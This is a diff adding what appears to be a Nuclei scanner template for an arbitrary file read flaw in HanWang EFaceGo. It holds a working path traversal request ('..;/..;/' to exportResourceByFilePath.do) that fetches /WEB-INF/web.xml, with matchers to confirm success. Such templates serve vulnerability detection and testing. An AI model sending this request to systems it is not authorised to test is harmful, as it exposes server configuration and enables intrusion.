@@ -1,0 +1,28 @@
+id: HanWangEFaceGo-exportResourceByFilePath-ReadAnyFile
+
+info:
+  name: HanWangEFaceGo-exportResourceByFilePath-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    HanWangEFaceGo-exportResourceByFilePath-ReadAnyFile.
+
+http:
+  - raw:
+      - |
+        GET /manage/intercom/..;/..;/manage/leaveList/exportResourceByFilePath.do?filePath=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ?xml version="1.0"
+          - <context-param
+        condition: and
+
+      - type: status
+        status:
+          - 200
